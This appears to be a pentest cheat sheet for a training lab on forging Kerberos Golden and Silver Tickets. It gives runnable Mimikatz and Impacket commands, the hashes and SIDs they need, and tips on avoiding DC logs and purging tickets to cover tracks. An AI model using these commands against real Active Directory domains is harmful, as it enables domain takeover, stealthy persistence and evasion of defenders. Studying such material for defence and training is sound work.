# Golden & Silver Tickets
**Concept:** Instead of asking the Domain Controller (KDC) for a ticket, we forge our own.
- **Golden Ticket (TGT):** You forge a Ticket Granting Ticket. You become **Any User** (Domain Admin) for **Any Service** on **Any Machine** in the domain. Requires the `krbtgt` hash.
- **Silver Ticket (TGS):** You forge a Ticket Granting Service ticket. You become **Any User** (Admin) for a **Specific Service** on a **Specific Machine**. Requires the Service Account's hash (machine hash).
## 1. The Golden Ticket (Domain Dominance)
**Target:** The entire Domain. **Requirement:** The **KRBTGT** account NTLM hash (dumped via DCSync). **Why:** This gives you a valid TGT for 10 years (by default). You can request access to anything.
### Prerequisites (Gathering Info)
Before forging, you need the Domain SID (not the user SID).
```powershell
# Get Domain SID
Get-DomainSID
# Example: S-1-5-21-123456789-123456789-123456789
```
### Method A: Windows (Mimikatz)
Injects the ticket directly into your current session's memory.
```powershell
# mimikatz #
# /sid: The Domain SID (No RID like -500 at the end)
# /krbtgt: The NTLM hash of the 'krbtgt' account
# /user: The user you want to impersonate (Fake user is fine)
# /id: The RID to impersonate (500 = Administrator)
# /ptt: Pass The Ticket (Inject immediately)

kerberos::golden /user:FakeAdmin /domain:inlanefreight.local /sid:S-1-5-21-... /krbtgt:9d765b482771505cbe97411065964d5f /id:500 /ptt
```
### Method B: Linux (Impacket)
Creates a `.ccache` file to use with Proxychains or Impacket tools.
```powershell
# ticketer.py
# -nthash: The krbtgt hash
# -domain-sid: Domain SID
ticketer.py -nthash 9d76... -domain-sid S-1-5-21-... -domain inlanefreight.local Administrator

# Load the ticket
export KRB5CCNAME=Administrator.ccache

# Use it (e.g., psexec without password)
psexec.py -k -no-pass inlanefreight.local/Administrator@dc01.inlanefreight.local
```
## 2. The Silver Ticket (Stealth Persistence)
**Target:** A specific server (e.g., SQL01, FileServer, or even the DC itself). **Requirement:** The **Machine Account** NTLM hash (e.g., `SQL01$`). **Why:**
1. **Stealth:** The DC (KDC) is **never contacted**. You generate a Service Ticket (TGS) locally and present it directly to the server. The DC generates no logs.
2. **Persistence:** Even if the `krbtgt` password is changed, this ticket works as long as the machine account password hasn't changed.
### Prerequisites
1. **Service Name:** What do you want to access?
    - `cifs` = File Shares (Access `C$`).
    - `http` = WinRM / IIS.
    - `host` = Scheduled Tasks / WMI.
    - `mssql` = SQL Server.
2. **Target Hash:** The NTLM hash of the computer account (e.g., `SQL01$`).
### Execution (Mimikatz)
```powershell
# mimikatz #
# /target: FQDN of the target machine
# /service: The service class (cifs, http, etc.)
# /rc4: The NTLM hash of the TARGET MACHINE account (SQL01$)
# /sid: Domain SID

kerberos::golden /domain:inlanefreight.local /user:FakeAdmin /sid:S-1-5-21-... /target:sql01.inlanefreight.local /service:cifs /rc4:8b8... /ptt
```
### Verification
Once injected, access the resource.
```powershell
# If you forged 'cifs':
dir \\sql01.inlanefreight.local\c$

# If you forged 'http' (allows WinRM):
Enter-PSSession -ComputerName sql01.inlanefreight.local
```
## 3. Verification & Cleanup
### Check Current Tickets
See what is currently in your session.
```powershell
# Windows
klist

# Linux
klist
```
### Purge Tickets
If the ticket fails or you want to clear your tracks.
```powershell
# Windows
klist purge
# OR inside Mimikatz:
kerberos::purge

# Linux
unset KRB5CCNAME
rm admin.ccache
```